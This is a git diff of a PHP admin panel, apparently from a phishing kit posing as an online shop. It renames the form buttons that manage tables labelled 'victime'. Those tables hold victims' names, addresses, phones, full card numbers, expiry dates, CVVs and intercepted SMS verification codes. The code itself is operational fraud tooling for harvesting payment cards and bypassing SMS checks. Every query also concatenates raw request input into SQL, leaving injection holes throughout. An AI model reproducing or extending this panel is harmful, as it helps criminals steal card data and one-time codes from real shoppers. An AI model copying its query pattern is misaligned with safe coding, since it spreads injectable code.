@@ -107,9 +107,9 @@ if(isset($_POST['submit']))
 
 
 <?php
-if(isset($_POST['update']))  {	if(     mysqli_query( $con  ,  "  update product set  id='".$_POST['id']."',   datetime='".$_POST['datetime']."',  ip='".$_POST['ip']."',       img='".$_POST['img']."',    gallery='".$_POST['gallery']."',   title='".$_POST['title']."',    	price1='".$_POST['price1']."',	  price2='".$_POST['price2']."',  quantity='".$_POST['quantity']."',	color='".$_POST['color']."',		sizee='".$_POST['sizee']."',	shipping='".$_POST['shipping']."',	description='".$_POST['description']."'	        where id='".$_GET['IDD']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
-if(isset($_POST['delete']))  {	if(     mysqli_query( $con  ,  "  delete from product where id='".$_GET['IDD']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
-if(isset($_POST['clear']))  {	if(     mysqli_query( $con  ,  "  delete from product "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  
+if(isset($_POST['updateproduct']))  {	if(     mysqli_query( $con  ,  "  update product set  id='".$_POST['id']."',   datetime='".$_POST['datetime']."',  ip='".$_POST['ip']."',       img='".$_POST['img']."',    gallery='".$_POST['gallery']."',   title='".$_POST['title']."',    	price1='".$_POST['price1']."',	  price2='".$_POST['price2']."',  quantity='".$_POST['quantity']."',	color='".$_POST['color']."',		sizee='".$_POST['sizee']."',	shipping='".$_POST['shipping']."',	description='".$_POST['description']."'	        where id='".$_GET['IDD']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
+if(isset($_POST['deleteproduct']))  {	if(     mysqli_query( $con  ,  "  delete from product where id='".$_GET['IDD']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
+if(isset($_POST['clearproduct']))  {	if(     mysqli_query( $con  ,  "  delete from product "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  
 
 $result  =  mysqli_query(      $con   ,     "select * from product "           );
 foreach($result as $row)	
@@ -143,14 +143,14 @@ foreach($result as $row)
 		<input type="text"   value="<?php echo $shipping ?>"    name="shipping" /><br/> 
 		<input type="text"   value="<?php echo $description ?>" name="description" /><br/> 
 						
-		<input type="submit" value="update"  name="update"/>	
-        <input type="submit" value="delete"  name="delete"/>
+		<input type="submit" value="update"  name="updateproduct"/>	
+        <input type="submit" value="delete"  name="deleteproduct"/>
         </form>				
   		<br/> <br/>	<br/>	<br/>	
 	    <?php 
 } 
         ?>
-		<form method="post"  action="?IDD=<?php echo $id ?>"     > <input type="submit" value="clear"  name="clear"/>  </form>	
+		<form method="post"  action="?IDD=<?php echo $id ?>"     > <input type="submit" value="clear"  name="clearproduct"/>  </form>	
         <?php
 ?>
 
@@ -173,9 +173,9 @@ foreach($result as $row)
 <div style="color:red;  font:800 20px 'cairo'; " >les victime addtocart </div>
 
 <?php
-if(isset($_POST['update']))  {	if(     mysqli_query( $con  ,  "  update addtocart set id='".$_POST['id']."',   idproduct='".$_POST['idproduct']."',  datetime='".$_POST['datetime']."',       ip='".$_POST['ip']."',     img='".$_POST['img']."',    	title='".$_POST['title']."',	price1='".$_POST['price1']."',	quantity='".$_POST['quantity']."',		color='".$_POST['color']."',	sizee='".$_POST['sizee']."',	shipping='".$_POST['shipping']."'       where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
-if(isset($_POST['delete']))  {	if(     mysqli_query( $con  ,  "  delete from addtocart where id='".$_GET['ID']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
-if(isset($_POST['clearaddtocart']))  {	if(     mysqli_query( $con  ,  "  delete from addtocart "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  
+if(isset($_POST['updatevictimeaddtocart']))  {	if(     mysqli_query( $con  ,  "  update addtocart set id='".$_POST['id']."',   idproduct='".$_POST['idproduct']."',  datetime='".$_POST['datetime']."',       ip='".$_POST['ip']."',     img='".$_POST['img']."',    	title='".$_POST['title']."',	price1='".$_POST['price1']."',	quantity='".$_POST['quantity']."',		color='".$_POST['color']."',	sizee='".$_POST['sizee']."',	shipping='".$_POST['shipping']."'       where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
+if(isset($_POST['deletevictimeaddtocart']))  {	if(     mysqli_query( $con  ,  "  delete from addtocart where id='".$_GET['ID']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
+if(isset($_POST['clearavictimeddtocart']))  {	if(     mysqli_query( $con  ,  "  delete from addtocart "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  
 
  
 $result  =  mysqli_query(      $con   ,     "select * from addtocart "           );
@@ -206,13 +206,13 @@ foreach($result as $row)
 			<input type="text"   value="<?php echo $sizee ?>"         name="sizee" /><br/> 
 			<input type="text"   value="<?php echo $shipping ?>"      name="shipping" /><br/> 
 			   
-			<input type="submit" value="update"  name="update"/>	
-            <input type="submit" value="delete"  name="delete"/>	
+			<input type="submit" value="update"  name="updatevictimeaddtocart"/>	
+            <input type="submit" value="delete"  name="deletevictimeaddtocart"/>	
   			<br/> <br/>	
 	        <?php 
 } 
             ?>
-		    <input type="submit" value="clear"  name="clearaddtocart"/>
+		    <input type="submit" value="clear"  name="clearvictimeaddtocart"/>
 		    </form>	
 	        <?php
 ?>
@@ -232,7 +232,7 @@ foreach($result as $row)
 
 
 
-
+victimesanscodsms
 
 
 
@@ -241,9 +241,9 @@ foreach($result as $row)
 <div style="color:red;  font:800 20px 'cairo'; " > les victime sans codsms </div>
 
 <?php
-if(isset($_POST['update']))  {	if(     mysqli_query( $con  ,  "  update orderclien set id='".$_POST['id']."',   datetime='".$_POST['datetime']."',  ip='".$_POST['ip']."',       img='".$_POST['img']."',     title='".$_POST['title']."',    	price1='".$_POST['price1']."',	quantity='".$_POST['quantity']."',	color='".$_POST['color']."',		sizee='".$_POST['sizee']."',	shipping='".$_POST['shipping']."',	subtotal='".$_POST['subtotal']."',	  totalprice='".$_POST['totalprice']."',  totalitem='".$_POST['totalitem']."',      email='".$_POST['email']."',	firstname='".$_POST['firstname']."',	lastname='".$_POST['lastname']."',	address='".$_POST['address']."',	city='".$_POST['city']."',	country='".$_POST['country']."',	postcode='".$_POST['postcode']."',	phone='".$_POST['phone']."',	nameoncard='".$_POST['nameoncard']."',	cardnumber='".$_POST['cardnumber']."',	expmm='".$_POST['expmm']."',	expyy='".$_POST['expyy']."',	cvv='".$_POST['cvv']."'        where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
-if(isset($_POST['delete']))  {	if(     mysqli_query( $con  ,  "  delete from orderclien where id='".$_GET['ID']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
-if(isset($_POST['clear']))  {	if(     mysqli_query( $con  ,  "  delete from orderclien "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  
+if(isset($_POST['updatevictimesanscodsms']))  {	if(     mysqli_query( $con  ,  "  update orderclien set id='".$_POST['id']."',   datetime='".$_POST['datetime']."',  ip='".$_POST['ip']."',       img='".$_POST['img']."',     title='".$_POST['title']."',    	price1='".$_POST['price1']."',	quantity='".$_POST['quantity']."',	color='".$_POST['color']."',		sizee='".$_POST['sizee']."',	shipping='".$_POST['shipping']."',	subtotal='".$_POST['subtotal']."',	  totalprice='".$_POST['totalprice']."',  totalitem='".$_POST['totalitem']."',      email='".$_POST['email']."',	firstname='".$_POST['firstname']."',	lastname='".$_POST['lastname']."',	address='".$_POST['address']."',	city='".$_POST['city']."',	country='".$_POST['country']."',	postcode='".$_POST['postcode']."',	phone='".$_POST['phone']."',	nameoncard='".$_POST['nameoncard']."',	cardnumber='".$_POST['cardnumber']."',	expmm='".$_POST['expmm']."',	expyy='".$_POST['expyy']."',	cvv='".$_POST['cvv']."'        where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
+if(isset($_POST['deletevictimesanscodsms']))  {	if(     mysqli_query( $con  ,  "  delete from orderclien where id='".$_GET['ID']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
+if(isset($_POST['clearvictimesanscodsms']))  {	if(     mysqli_query( $con  ,  "  delete from orderclien "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  
 
  
 $result  =  mysqli_query(      $con   ,     "select * from orderclien "           );
@@ -304,13 +304,13 @@ foreach($result as $row)
 			<input type="text"   value="<?php echo $expyy ?>"       name="expyy" /><br/> 
 			<input type="text"   value="<?php echo $cvv ?>"         name="cvv" /><br/> 
 			   
-			<input type="submit" value="update"  name="update"/>	
-            <input type="submit" value="delete"  name="delete"/>	
+			<input type="submit" value="update"  name="updatevictimesanscodsms"/>	
+            <input type="submit" value="delete"  name="deletevictimesanscodsms"/>	
   			<br/> <br/>	
 	        <?php 
 } 
             ?>
-		    <input type="submit" value="clear"  name="clear"/>
+		    <input type="submit" value="clear"  name="clearvictimesanscodsms"/>
 		    </form>	
 	        <?php
 ?>
@@ -320,14 +320,14 @@ foreach($result as $row)
 
 
 
-
+victimeaveccodsms
 
 <br/><br/><br/><br/><br/>
 <div style="color:red;  font:800 20px 'cairo'; " >les victime avec codsms</div>
 <?php 
-if(isset($_POST['update']))  {	if(     mysqli_query( $con  ,  "  update ordercliencodesms set  id='".$_POST['id']."',  datetime='".$_POST['datetime']."',  ip='".$_POST['ip']."',       totalitem='".$_POST['totalitem']."',    totalprice='".$_POST['totalprice']."',   email='".$_POST['email']."',    	firstname='".$_POST['firstname']."',	  lastname='".$_POST['lastname']."',  address='".$_POST['address']."',	city='".$_POST['city']."',		country='".$_POST['country']."',	postcode='".$_POST['postcode']."',	phone='".$_POST['phone']."',	nameoncard='".$_POST['nameoncard']."',	cardnumber='".$_POST['cardnumber']."',	expmm='".$_POST['expmm']."',	expyy='".$_POST['expyy']."',	cvv='".$_POST['cvv']."',	codesms='".$_POST['codesms']."'	         where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
-if(isset($_POST['delete']))  {	if(     mysqli_query( $con  ,  "  delete from ordercliencodesms where id='".$_GET['ID']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
-if(isset($_POST['clear']))  {	if(     mysqli_query( $con  ,  "  delete from ordercliencodesms "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  
+if(isset($_POST['updatevictimeaveccodsms']))  {	if(     mysqli_query( $con  ,  "  update ordercliencodesms set  id='".$_POST['id']."',  datetime='".$_POST['datetime']."',  ip='".$_POST['ip']."',       totalitem='".$_POST['totalitem']."',    totalprice='".$_POST['totalprice']."',   email='".$_POST['email']."',    	firstname='".$_POST['firstname']."',	  lastname='".$_POST['lastname']."',  address='".$_POST['address']."',	city='".$_POST['city']."',		country='".$_POST['country']."',	postcode='".$_POST['postcode']."',	phone='".$_POST['phone']."',	nameoncard='".$_POST['nameoncard']."',	cardnumber='".$_POST['cardnumber']."',	expmm='".$_POST['expmm']."',	expyy='".$_POST['expyy']."',	cvv='".$_POST['cvv']."',	codesms='".$_POST['codesms']."'	         where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
+if(isset($_POST['deletevictimeaveccodsms']))  {	if(     mysqli_query( $con  ,  "  delete from ordercliencodesms where id='".$_GET['ID']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
+if(isset($_POST['clearvictimeaveccodsms']))  {	if(     mysqli_query( $con  ,  "  delete from ordercliencodesms "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  
 
 $result  =  mysqli_query(      $con   ,     "select * from ordercliencodesms " ); 
 foreach($result as $row)	 
@@ -372,13 +372,13 @@ foreach($result as $row)
 	 <input type="text"   value="<?php echo $expyy ?>"          name="expyy" /><br/> 
 	 <input type="text"   value="<?php echo $cvv ?>"            name="cvv" /><br/> 
 	 <input type="text"   value="<?php echo $codesms ?>"        name="codesms" /><br/> 
-     <input type="submit" value="update"  name="update"/>	
-     <input type="submit" value="delete"  name="delete"/>
+     <input type="submit" value="update"  name="updatevictimeaveccodsms"/>	
+     <input type="submit" value="delete"  name="deletevictimeaveccodsms"/>
 	 <br/> <br/>	
      <?php 
 } 
      ?>
-     <input type="submit" value="clear"  name="clear"/>
+     <input type="submit" value="clear"  name="clearvictimeaveccodsms"/>
      </form>			 
      <?php		 
 ?> 
@@ -416,9 +416,9 @@ foreach($result as $row)
 
 
 <?php
-if(isset($_POST['update']))  {	if(     mysqli_query( $con  ,  "  update message set   id='".$_POST['id']."',  datetime='".$_POST['datetime']."',  ip='".$_POST['ip']."',      img='".$_POST['img']."',    gallery='".$_POST['gallery']."',   title='".$_POST['title']."',    	price1='".$_POST['price1']."',	  price2='".$_POST['price2']."',  quantity='".$_POST['quantity']."',	color='".$_POST['color']."',		sizee='".$_POST['sizee']."',	shipping='".$_POST['shipping']."',	description='".$_POST['description']."'	        where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
-if(isset($_POST['delete']))  {	if(     mysqli_query( $con  ,  "  delete from message where id='".$_GET['ID']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
-if(isset($_POST['clear']))  {	if(     mysqli_query( $con  ,  "  delete from message "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  
+if(isset($_POST['updatemessage']))  {	if(     mysqli_query( $con  ,  "  update message set   id='".$_POST['id']."',  datetime='".$_POST['datetime']."',  ip='".$_POST['ip']."',      img='".$_POST['img']."',    gallery='".$_POST['gallery']."',   title='".$_POST['title']."',    	price1='".$_POST['price1']."',	  price2='".$_POST['price2']."',  quantity='".$_POST['quantity']."',	color='".$_POST['color']."',		sizee='".$_POST['sizee']."',	shipping='".$_POST['shipping']."',	description='".$_POST['description']."'	        where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
+if(isset($_POST['deletemessage']))  {	if(     mysqli_query( $con  ,  "  delete from message where id='".$_GET['ID']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
+if(isset($_POST['clearmessage']))  {	if(     mysqli_query( $con  ,  "  delete from message "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  
 
 $result  =  mysqli_query(      $con   ,     "select * from message "           );
 foreach($result as $row)	
@@ -442,14 +442,14 @@ foreach($result as $row)
 		<input type="text"   value="<?php echo $phone ?>"               name="phone" /><br/>
 		<input type="text"   value="<?php echo $message ?>"             name="message" /><br/>
 						
-		<input type="submit" value="update"  name="update"/>	
-        <input type="submit" value="delete"  name="delete"/>
+		<input type="submit" value="update"  name="updatemessage"/>	
+        <input type="submit" value="delete"  name="deletemessage"/>
         </form>				
   		<br/> <br/>	<br/>	<br/>	
 	    <?php 
 } 
 	    ?>
-		<form method="post"  action="?ID=<?php echo $id ?>"     > <input type="submit" value="clear"  name="clear"/>  </form>	
+		<form method="post"  action="?ID=<?php echo $id ?>"     > <input type="submit" value="clear"  name="clearmessage"/>  </form>	
         <?php
 ?>
 
